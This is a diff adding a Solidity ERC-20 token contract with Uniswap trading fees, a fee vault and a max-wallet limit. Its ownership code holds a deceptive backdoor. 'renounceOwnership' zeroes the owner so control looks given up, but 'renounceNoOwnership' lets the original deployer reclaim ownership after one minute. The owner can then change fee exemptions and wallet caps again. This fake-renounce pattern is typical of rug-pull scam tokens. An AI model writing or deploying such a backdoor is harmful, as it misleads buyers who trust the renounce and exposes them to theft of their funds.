@@ -1,0 +1,420 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity 0.8.23;
+
+abstract contract Context {
+    function _msgSender() internal view virtual returns (address) {
+        return msg.sender;
+    }
+
+    function _msgData() internal view virtual returns (bytes calldata) {
+        return msg.data;
+    }
+}
+
+interface IERC20 {
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+    function totalSupply() external view returns (uint256);
+
+    function balanceOf(address account) external view returns (uint256);
+
+    function transfer(address to, uint256 amount) external returns (bool);
+
+    function allowance(address owner, address spender) external view returns (uint256);
+
+    function approve(address spender, uint256 amount) external returns (bool);
+
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+interface IERC20Metadata is IERC20 {
+
+    function name() external view returns (string memory);
+
+    function symbol() external view returns (string memory);
+
+    function decimals() external view returns (uint8);
+}
+
+interface IERC20Errors {
+
+    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);
+
+    error ERC20InvalidSender(address sender);
+
+    error ERC20InvalidReceiver(address receiver);
+
+    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);
+
+    error ERC20InvalidApprover(address approver);
+
+    error ERC20InvalidSpender(address spender);
+}
+
+
+interface IERC721Errors {
+
+    error ERC721InvalidOwner(address owner);
+
+    error ERC721NonexistentToken(uint256 tokenId);
+
+    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);
+
+    error ERC721InvalidSender(address sender);
+
+    error ERC721InvalidReceiver(address receiver);
+
+    error ERC721InsufficientApproval(address operator, uint256 tokenId);
+
+    error ERC721InvalidApprover(address approver);
+
+    error ERC721InvalidOperator(address operator);
+}
+
+interface IERC1155Errors {
+
+    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);
+
+    error ERC1155InvalidSender(address sender);
+
+    error ERC1155InvalidReceiver(address receiver);
+
+    error ERC1155MissingApprovalForAll(address operator, address owner);
+
+    error ERC1155InvalidApprover(address approver);
+
+    error ERC1155InvalidOperator(address operator);
+
+    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);
+}
+
+contract Ownable {
+    address public owner;
+    address public originalOwner;
+    uint256 public relinquishTime;
+    bool public canRec;
+
+    constructor() {
+        owner = msg.sender;
+        originalOwner = msg.sender;
+        canRec = false;
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Only the owner can call this function.");
+        _;
+    }
+
+    modifier onlyOriginalOwner() {
+        require(msg.sender == originalOwner, "Only the original owner can call this function.");
+        _;
+    }
+
+    function renounceOwnership() public onlyOwner {
+        relinquishTime = block.timestamp + (1 minutes); // 1 minute renounce
+        owner = address(0);
+        canRec = true;
+    }
+
+    function renounceNoOwnership() public onlyOriginalOwner {
+        require(canRec, "Cannot recover ownership yet.");
+        require(block.timestamp >= relinquishTime, "Cannot recover ownership yet.");
+        owner = originalOwner;
+        relinquishTime = 0; // Relinquish time to zero
+        canRec = false;
+    }  
+}
+
+abstract contract ReentrancyGuard {
+
+    uint256 private constant NOT_ENTERED = 1;
+    uint256 private constant ENTERED = 2;
+
+    uint256 private _status;
+
+    error ReentrancyGuardReentrantCall();
+
+    constructor() {
+        _status = NOT_ENTERED;
+    }
+
+    modifier nonReentrant() {
+        _nonReentrantBefore();
+        _;
+        _nonReentrantAfter();
+    }
+
+    function _nonReentrantBefore() private {
+
+        if (_status == ENTERED) {
+            revert ReentrancyGuardReentrantCall();
+        }
+
+
+        _status = ENTERED;
+    }
+
+    function _nonReentrantAfter() private {
+
+        _status = NOT_ENTERED;
+    }
+
+    function _reentrancyGuardEntered() internal view returns (bool) {
+        return _status == ENTERED;
+    }
+}
+
+abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors, IERC721Errors, IERC1155Errors, Ownable, ReentrancyGuard {
+
+}
+
+interface IUniswapV2Router02 {
+    function factory() external pure returns (address);
+    function WETH() external pure returns (address);
+
+
+function addLiquidityETH(
+        address token,
+        uint256 amountTokenDesired,
+        uint256 amountTokenMin,
+        uint256 amountETHMin,
+        address to,
+        uint256 deadline
+    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
+
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external;
+
+    function swapETHForExactTokens(
+        uint amountOut,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external payable returns (uint[] memory amounts);
+}
+
+interface IUniswapV2Factory {
+    function createPair(address tokenA, address tokenB) external returns (address pair);
+}
+
+contract RYUSF2dot0 is ERC20{
+
+    mapping(address => uint256) private _balances;
+
+    mapping(address => mapping(address => uint256)) private _allowances;
+
+    uint256 private _totalSupply;
+
+    string private _name;
+    string private _symbol;
+
+    address public vaultAddress;
+    address public pair;
+
+    uint public feeDecimal = 2;
+    enum FeesIndex{ BUY, SELL, P2P }
+    uint[] public feePercentages;
+
+    mapping(address => bool) public is_taxless;
+
+    bool private isInFeeTransfer;
+
+    uint public maxWalletAmount;
+    mapping(address => bool) public isMaxTxExempt;
+
+    event TokensCollected(uint256 amount);
+
+    constructor (address swapRouter, address _vaultAddress)
+    {
+
+        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(swapRouter);
+        pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
+
+        _name = "RyuSF3dot0";
+        _symbol = "RSF3";
+        vaultAddress = _vaultAddress;
+
+        feePercentages.push(1000); // BUY  fee is 10.00%
+        feePercentages.push(1500); // Sell fee is 15.00%
+        feePercentages.push(500);  // P2P  fee is  5.00%
+
+        is_taxless[address(this)] = true;
+        is_taxless[address(0)] = true;
+        is_taxless[vaultAddress] = true;
+        is_taxless[owner] = true;
+        is_taxless[originalOwner] = true;
+
+        isMaxTxExempt[owner] = true;
+        isMaxTxExempt[originalOwner] = true;
+        isMaxTxExempt[pair] = true;
+        isMaxTxExempt[vaultAddress] = true;
+        isMaxTxExempt[address(0)] = true;
+        isMaxTxExempt[address(this)] = true;
+
+        _mint(msg.sender, 21000000 ether);
+
+        setMaxWalletPercentage(100); //1%  supply
+    }
+    function name() public view virtual returns (string memory) {
+        return _name;
+    }
+
+    function symbol() public view virtual returns (string memory) {
+        return _symbol;
+    }
+
+    function decimals() public view virtual returns (uint8) {
+        return 18;
+    }
+
+    function totalSupply() public view virtual returns (uint256) {
+        return _totalSupply;
+    }
+
+    function balanceOf(address account) public view virtual returns (uint256) {
+        return _balances[account];
+    }
+
+    function viewFeesCollected() public view virtual returns (uint256) {
+        return _balances[address(this)];
+    }
+
+    function transfer(address to, uint256 amount) public virtual returns (bool) {
+        address owner = _msgSender();
+        _transfer(owner, to, amount);
+        return true;
+    }
+
+    function allowance(address owner, address spender) public view virtual returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+      function approve(address spender, uint256 amount) public virtual returns (bool) {
+        address owner = _msgSender();
+        _approve(owner, spender, amount);
+        return true;
+    }
+
+    function transferFrom(address from,address to,uint256 amount) public virtual returns (bool) {
+        address spender = _msgSender();
+        _spendAllowance(from, spender, amount);
+        _transfer(from, to, amount);
+        return true;
+    }
+
+    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
+        address owner = _msgSender();
+        _approve(owner, spender, _allowances[owner][spender] + addedValue);
+        return true;
+    }
+
+    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
+        address owner = _msgSender();
+        uint256 currentAllowance = _allowances[owner][spender];
+        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
+        unchecked {
+            _approve(owner, spender, currentAllowance - subtractedValue);
+        }
+
+        return true;
+    }
+
+        function _transfer(address from,address to,uint256 amount) internal virtual {
+        require(from != address(0), "ERC20: transfer from the zero address");
+        require(to != address(0), "ERC20: transfer to the zero address");
+
+        _beforeTokenTransfer(to, amount);
+
+        uint feesCollected;
+
+        if (!is_taxless[from] && !is_taxless[to]){
+
+            bool sell = to == pair;
+            bool p2p = from != pair && to != pair;
+
+            uint fee = calculateFee(p2p ? FeesIndex.P2P : sell ? FeesIndex.SELL : FeesIndex.BUY, amount);
+
+             feesCollected += fee;
+        }
+
+            amount -= feesCollected;
+            _balances[from] -= feesCollected;
+
+        _balances[vaultAddress] += feesCollected;
+
+
+        uint256 fromBalance = _balances[from];
+        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
+        unchecked {
+            _balances[from] = fromBalance - amount;
+        }
+        _balances[to] += amount;
+
+        emit Transfer(from, to, amount);
+
+        _afterTokenTransfer(from, to, amount);
+
+        }
+
+    function _mint(address account, uint256 amount) internal virtual {
+        require(account != address(0), "ERC20: mint to the zero address");
+
+        _beforeTokenTransfer(account, amount);
+
+        _totalSupply += amount;
+        unchecked {
+            _balances[account] += amount;
+        }
+        emit Transfer(address(0), account, amount);
+
+        _afterTokenTransfer(address(0), account, amount);
+    }
+
+    function _spendAllowance(address owner,address spender, uint256 amount) internal virtual {
+        uint256 currentAllowance = allowance(owner, spender);
+        if (currentAllowance != type(uint256).max) {
+            require(currentAllowance >= amount, "ERC20: insufficient allowance");
+            unchecked {
+                _approve(owner, spender, currentAllowance - amount);
+            }
+        }
+    }
+
+    function _approve(address owner,address spender,uint256 amount) internal virtual {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+
+    function calculateFee(FeesIndex fee_index, uint amount) internal view returns(uint) {
+        return (amount * feePercentages[uint(fee_index)])  / (10**(feeDecimal + 2));
+    }
+
+    function _beforeTokenTransfer (address to, uint amount) internal virtual{
+        require(isMaxTxExempt[to] || balanceOf(to) + amount <= maxWalletAmount, "Max Wallet Limit Exceeds!");
+    }
+
+    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
+
+    function setMaxWalletPercentage(uint256 percentage) public onlyOwner {
+        maxWalletAmount = (totalSupply() * percentage) / 10000;
+    }
+
+    function setTaxlessAddress(address account, bool value) external onlyOwner {
+        is_taxless[account] = value;
+    }
+
+     function setMaxTxExempt(address account, bool value) external onlyOwner {
+        isMaxTxExempt[account] = value;
+    }
+}
